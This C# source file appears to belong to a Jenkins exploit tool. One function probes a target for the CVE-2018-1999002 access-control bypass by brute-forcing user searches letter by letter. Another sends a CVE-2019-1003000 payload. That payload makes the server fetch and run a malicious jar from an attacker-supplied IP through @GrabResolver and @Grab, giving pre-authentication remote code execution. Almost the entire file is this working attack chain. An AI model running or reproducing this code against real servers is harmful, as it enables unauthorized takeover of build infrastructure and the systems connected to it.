using System;
using System.Net.Http;
using System.Threading.Tasks;
using Newtonsoft.Json;
using HtmlAgilityPack;
using jenkins_server_rce;
using System.Threading;
using System.Collections.Generic;

namespace jenkins_server_rce.jenkinsrequests
{
    public class Jenkins_Requests
    {
        //CVE Exploit: CVE-2018-1999002 (Acess Control List Bypass)
        //Function Name: DetectACLBypass
        //Function Parameters => Return Type : Void => Void
        //Function Purpose: The function will send a GET request to jenkins.local to determine if 
        //an ACL bypass exists. The request will be /securityRealm/user/[username]/descriptorByName/[descriptor_name]/
        public static bool DetectACLBypass(HttpClient client, string url)
        {
            HtmlAgilityPack.HtmlDocument document = new HtmlAgilityPack.HtmlDocument();
            List<string> alphabet = new List<string>();
            //Create list of characters [a-z] to test in paramets "q" in payload on line 31
            for (int i = 0; i < 26; i++)
            {
                var letter = i + 97;
                var stringRepresentation = (char)letter;
                alphabet.Add(stringRepresentation.ToString());

            }

            foreach (string possibleLetter in alphabet)
            {
                Thread.Sleep(500);
                //The /admin/ in this payload is one of the ids found in the targeted Jenkins server. However, there is no need 
                //to create a list to brute force them because in vulnerable versions, you can put any id there (in place of admin)
                // and find a list of other real users that have access to jenkins. In up to date versions, this query should only
                // return an error as well so another reason why we can leave it hardcoded as is.
                string payload = $"{url}/securityRealm/user/admin/search/index?q={possibleLetter}";
                Console.WriteLine($"[+] Testing for ACL Bypass...\n   Using Parameter: q={possibleLetter}");
                try
                {
                    using (HttpResponseMessage response = client.GetAsync(payload).Result)
                    {
                        using (HttpContent content = response.Content)
                        {
                            document.LoadHtml(content.ReadAsStringAsync().Result);
                            HtmlNodeCollection idToScrape = document.DocumentNode.SelectNodes("//div[@class='error']");
                            HtmlNodeCollection doubleCheckInCaseOfFalsePositive = document.DocumentNode.SelectNodes("//html");
                            // Try/catch block on determining if this error class exists. Upon a successful lookup
                            // the results of the ids containing the letter specified in the {q} paramters will be 
                            // returned and there will not be error. A capture exception means there is no error and thus
                            // the GET request worked and the CVE is present
                            try
                            {
                                foreach (HtmlNode node in idToScrape)
                                {
                                    Console.WriteLine($"   Response to parameter input: {node.InnerText}");
                                }
                            }
                            catch (Exception)
                            {
                                Thread.Sleep(1000);
                                Console.WriteLine("[+] Can Initiate Pre-Auth RCE");
                                DoubleCheckACLBypass(doubleCheckInCaseOfFalsePositive);
                                return true;
                            }
                        }
                    }
                }catch(Exception e)
                {
                    Console.WriteLine($"HTTP Request Error. Please enter 'http://' when adding your command line arguments");
                    System.Environment.Exit(3);
                }
            }
            return false;
        }


        //Function Name: DoubleCheckACLBypass
        //Function Parameters => Return Type : HtmlNodeCollection => Void
        //Function Purpose: Will check to ensure that there is no false positive when detecting the presense of an ACL Bypass
        public static void DoubleCheckACLBypass(HtmlNodeCollection node)
        {
            if (node[0].InnerText.Contains("/securityRealm/user/admin/search/index"))
            {
                Thread.Sleep(1000);
                Console.WriteLine("Double checking positive result");
                Thread.Sleep(1000);
                Console.WriteLine("[X]False positive caught.\n[X]No pre-auth RCE.\n[X]Quitting");
                System.Environment.Exit(4);
            }
        }

        //CVE Exploit: CVE-2019-1003000
        //Function Name: SendPayloadInGETRequest
        //Function Parameters => Return Type : String => Void
        //Function Purpose: Will send the malicious GET request with the malicious
        //jar file to Jenkins server
        public static string SendPayloadInGETRequest(string url, string ip, HttpClient client)
        {
            string payload = $"{url}descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?" +
                $"value=@GrabResolver(name=%27orange.tw%27,%20root=%27http://{ip}%27)%0a" +
                "@Grab(group=%27tw.orange%27,%20module=%27poc%27,%20version=%271%27)%0aimport%20NixExploit";
            Thread.Sleep(1000);
            Console.WriteLine("[+] Sending Malicious GET Request...");

            using (HttpResponseMessage response = client.GetAsync(payload).Result)
            {
                using (HttpContent content = response.Content)
                {
                    string myContent = content.ReadAsStringAsync().Result;
                    try
                    {
                        JenkinsJSONResponse jResponse = JsonConvert.DeserializeObject<JenkinsJSONResponse>(myContent);
                        return jResponse.status;
                    }
                    catch
                    {
                        Thread.Sleep(1000);
                        Console.WriteLine($"{myContent}\nError parsing JSON");
                        return Program.RCESuccess.ErrorInRequest.ToString();
                    }

                }
            }
        }
    }

    //The reponse after sending the malicious GET request is a JSON with these 4 keys
    //Creating this class will use be used for Json deserialization
    public class JenkinsJSONResponse
    {
        public int column { get; set; }
        public int line { get; set; }
        public string message { get; set; }
        public string status { get; set; }
    }
}
